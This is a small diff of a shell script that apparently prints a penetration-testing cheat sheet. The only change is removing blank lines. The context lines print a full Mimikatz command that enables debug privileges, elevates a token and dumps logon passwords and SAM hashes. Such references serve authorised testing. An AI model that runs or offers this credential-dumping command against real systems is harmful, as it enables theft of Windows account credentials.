@@ -71,6 +71,3 @@ echo -e ""
 echo -e "${Frame}###${End} ${Title}Mimikatz [admin required]${End} ${Frame}###${End}"
 echo -e "${Point} mimikatz \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"exit\""
 echo -e ""
-
-
-
